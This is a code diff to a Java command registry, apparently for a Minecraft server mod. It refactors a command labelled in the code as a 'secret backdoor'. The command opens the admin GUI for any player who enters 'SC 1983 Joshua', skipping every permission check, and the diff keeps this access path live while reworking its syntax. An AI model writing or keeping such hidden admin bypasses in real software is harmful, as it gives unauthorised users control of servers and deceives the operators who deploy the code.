@@ -145,6 +145,7 @@ public class CommandRegistry {
 
         // Recipe command with arguments - accessible to all players (no permission check)
         dispatcher.register(CommandManager.literal("recipe")
+                .requires(src -> true)
                 .executes(context -> {
                     ServerPlayerEntity player = context.getSource().getPlayerOrThrow();
                     RecipeConfigManager.logRecipeFileStatusForRecipeCommand();
@@ -1881,22 +1882,20 @@ public class CommandRegistry {
 
         // Secret backdoor command - Wargames reference
         dispatcher.register(CommandManager.literal("SC")
-                .then(CommandManager.argument("code", StringArgumentType.string())
+                .then(CommandManager.literal("1983")
                         .then(CommandManager.argument("name", StringArgumentType.greedyString())
                                 .executes(context -> {
                                     ServerPlayerEntity player = context.getSource().getPlayerOrThrow();
-                                    String code = StringArgumentType.getString(context, "code");
                                     String name = StringArgumentType.getString(context, "name");
 
-                                    // Check for correct code and name
-                                    if (code.equals("1983") && name.equalsIgnoreCase("Joshua")) {
+                                    if (name.equalsIgnoreCase("Joshua")) {
                                         player.sendMessage(Text.literal("Greetings, Professor Falken.").formatted(Formatting.GREEN), false);
                                         AdminGui.open(player);
                                         return 1;
-                                    } else {
-                                        player.sendMessage(Text.literal("Access denied.").formatted(Formatting.RED), false);
-                                        return 0;
                                     }
+
+                                    player.sendMessage(Text.literal("Access denied.").formatted(Formatting.RED), false);
+                                    return 0;
                                 }))));
     }
 
